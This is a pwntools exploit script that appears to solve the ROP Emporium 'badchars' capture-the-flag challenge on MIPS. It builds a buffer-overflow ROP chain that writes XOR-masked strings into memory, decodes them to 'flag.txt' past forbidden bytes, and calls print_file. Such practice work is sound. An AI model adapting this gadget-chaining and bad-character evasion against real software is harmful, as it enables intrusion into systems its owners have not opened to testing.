from pwn import *

splash()
elf = context.binary = ELF("./badchars_mipsel")


"""
Bad Characters:
    x   g   a   .
    78  67  61  2E

Target:
            *   *   *       *
    f   l   a   g   .   t   x   t
    66  6c  61  67  2E  74  78  74
"""


class ROP:
    write_gadget = 0x00400930  # lw $t9, 0xc($sp); lw $t0, 8($sp); lw $t1, 4($sp); sw $t1, ($t0); jalr $t9; addi $sp, $sp, 0x10;
    set_args     = 0x00400968  # lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; addi $sp, $sp, 0xc;
    xor_gadget   = 0x00400948  # lw $t9, 12(sp); lw	t0,8(sp); lw t1,4(sp); lw t2,0(t1); xor	t0,t0,t2; sw t0,0(t1); jalr t9
    data_start   = 0x00411000

def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)


def solve():
    io = conn()

    padding = cyclic(36)

    payload = [
        padding,
        ROP.write_gadget,
        0xDEADBEEF,
        b"fl`f",
        ROP.data_start,
        ROP.write_gadget,
        0xDEADBEEF,
        b"-twt",
        ROP.data_start + 4,
        ROP.xor_gadget,
        0xDEADBEEF,
        ROP.data_start,
        int.from_bytes((b"fl`f"), "little") ^ int.from_bytes(b"flag", "little"),
        ROP.xor_gadget,
        0xDEADBEEF,
        ROP.data_start + 4,
        int.from_bytes((b"-twt"), "little") ^ int.from_bytes(b".txt", "little"),
        ROP.set_args,
        0xDEADBEEF,
        elf.sym.print_file,
        ROP.data_start
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()